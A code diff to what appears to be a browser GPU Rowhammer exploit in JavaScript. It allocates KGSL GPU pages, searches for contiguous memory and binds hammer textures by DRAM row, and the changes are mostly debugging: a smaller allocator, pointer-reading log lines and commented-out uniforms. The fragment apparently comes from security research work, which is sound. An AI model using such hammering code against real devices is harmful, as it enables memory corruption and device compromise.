@@ -8,8 +8,17 @@ async function glitch() {
     initFramebuffer();
     
     allocatePages(PAGES_PER_MB * 32);
-    const allocator = new Allocator(PAGES_PER_MB * 164);
+    const allocator = new Allocator(PAGES_PER_MB * 4);
     await allocator._init(0);
+    
+    console.log(await readPtr(allocator.newKGSL[7].v_addr))
+    console.log(await readPtr(allocator.newKGSL[8].v_addr))
+    console.log(await readPtr(allocator.newKGSL[16].v_addr))
+    console.log(await readPtr(allocator.newKGSL[1000].v_addr))
+    console.log(await readPtr(allocator.newKGSL[2435].v_addr))
+    console.log(await readTexture(allocator.newKGSL[2435].v_addr))
+    // return;
+    
     const contPages = allocator.SearchContPages();
     // const contPages = mockContPages(10)
 
@@ -87,8 +96,8 @@ async function hammerTime(contMem) {
             console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
             
             // Uniforms as debug tool
-            shader.setInt('bank0', offset);
-            shader.setInt('bank1', offset + 1);
+            // shader.setInt('bank0', offset);
+            // shader.setInt('bank1', offset + 1);
 
             // pass hammer textures according to hammer pattern: jump to differnet row to trigger row buffer when hammering
             shader.bindTexture(contMem[offset + 0].texture, 0, 'H', offset + 0);
